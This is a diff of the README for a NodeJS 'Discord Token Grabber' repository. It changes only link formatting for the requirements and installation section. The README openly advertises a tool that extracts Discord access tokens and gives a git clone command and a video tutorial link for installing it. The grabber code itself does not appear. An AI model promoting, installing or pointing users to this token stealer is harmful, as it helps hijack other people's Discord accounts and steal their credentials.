@@ -9,9 +9,6 @@
 [github-forks-link]: https://github.com/k4itrun/DiscordTokenGrabber/network/members
 
 [github-link]: https://github.com/k4itrun/DiscordTokenGrabber
-[youtube-link]: https://www.youtube.com/watch?v=_Kfq557P0n4
-[nodejs-link]: https://nodejs.org/en
-[visualstudio-link]: https://visualstudio.microsoft.com/es/downloads
 
 <div align="center">
 
@@ -29,13 +26,13 @@ Discord T0k3n Gr4bb3r written in NodeJS, which extracts all Discord Access Token
 </div>
 
 # Requirements
-- Downloads NodeJS Version [LTS][nodejs-link]
-- Download [Visual Studio Build Tools][visualstudio-link] For C++ compilation
+- Downloads NodeJS Version <a href="https://nodejs.org/en" target="_blank">LTS</a>
+- Download <a href="https://visualstudio.microsoft.com/es/downloads" target="_blank">Visual Studio Build Tools</a> For C++ compilation
 
 *I emphasize that it is very important that you have this installed, to avoid errors*
 
 ## Installation
-- Follow these steps to have it or watch the video [YouTube!][youtube-link]
+- Follow these steps to have it or watch the video <a href="https://www.youtube.com/watch?v=_Kfq557P0n4" target="_blank">YouTube!</a>
 ```bash
 git clone https://github.com/k4itrun/DiscordTokenGrabber.git
 ```
